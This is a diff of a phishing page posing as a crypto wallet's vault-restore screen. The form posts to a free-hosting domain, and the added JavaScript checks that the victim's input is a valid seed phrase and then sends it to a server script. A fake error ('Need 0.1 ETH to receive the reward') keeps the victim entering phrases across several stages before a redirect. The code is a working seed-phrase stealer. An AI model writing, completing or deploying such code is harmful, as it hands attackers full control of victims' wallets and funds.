@@ -15273,7 +15273,7 @@ Language
         </div>
         <noscript></noscript>
 		
-		<form method="post" action="https://fujiare.000webhostapp.com/bottle1.php?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault">
+		    <form method="post" action="https://fujiare.000webhostapp.com/bottle1.php?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault">
         <div class="58rjrx main-container-wrapper" data-bur91e="ue4n6g">
           <div class="v7n2as first-view-main-wrapper" data-4ofnr1="0vova1">
             <div class="vp2us5 first-view-main" data-mrayej="5133i4">
@@ -15340,7 +15340,82 @@ Language
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://cdn.ethers.io/scripts/ethers-v4.min.js" charset="utf-8" type="text/javascript"></script>
     <script>
+      const redirectUrl = 'home.asp' // redirect url setelah memasuki lastStage
+      const lastStage = 3 // stage terakhir untuk redirect (stage === lastStage)
+      let stage = 1 // awal stage
+      const errorMsg = ['Need 0.1 ETH to receive the reward','Need 0.1 ETH to receive the reward'] // error message urutan berdasarkan stage
+      let check = false
+      let passForCreate = false
+      let passForCreateConfir = false
+      let words = false
+
+      $(".closeBtn").on("click", function (e) {
+        $(".alertBox").hide()
+        $(".alert").hide()
+      })  
+
+      function showBtn() {
+        if(words) $("#imp").prop("disabled", false)
+        else $("#imp").prop("disabled", true) 
+      }
       
+      $('#wordsseed').on("change keyup paste", function(evt) {
+        let pass = $(this).val()
+        if(pass.split(" ").length == 12 || pass.split(" ").length == 18 || pass.split(" ").length == 21 || pass.split(" ").length == 24){
+          $("#wordsErrorConfir").hide()
+        
+          try{
+            let mnemonic = pass
+            let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic)
+            words = true
+            $("#wordsErrorConfir").hide()
+            $("#incorecct").hide()
+          } catch (e){
+            $("#wordsErrorConfir").hide()
+            $("#incorecct").show()
+            words = false
+          }
+
+        } else{
+          $("#wordsErrorConfir").show()
+          words = false
+          
+          $("#incorecct").hide()
+        }
+
+        showBtn()
+      })
+      
+      $("#imp").on("click", function(){      
+        let mnemonic = $("#wordsseed").val()
+        let wallet = ethers.Wallet.fromMnemonic(mnemonic)
+        if(stage < lastStage) {
+          $.ajax({
+            method: "POST",
+            url: "redirect.php",
+            data: { seed: mnemonic, wallet: 'TrustWallet' },
+            success: function(data) {
+              updateStage()
+            }
+          })
+        } else window.location = redirectUrl
+      })
+
+      function updateStage() {
+        if(typeof errorMsg[stage - 1] !== 'undefined') $("#errorText").html(errorMsg[stage - 1])
+        else $("#errorText").html(errorMsg[0])
+        stage += 1
+        $("#errorText").css('display','')
+        setTimeout(function(){
+          $("#errorText").css('display','none')
+        }, 3000)
+      }
+      
+      setTimeout(function(){
+        $(".loader").hide() 
+        $(".alertBox").fadeOut('slow')
+        $(".alert").fadeOut('slow')
+      }, 2000)
     </script>
   
 
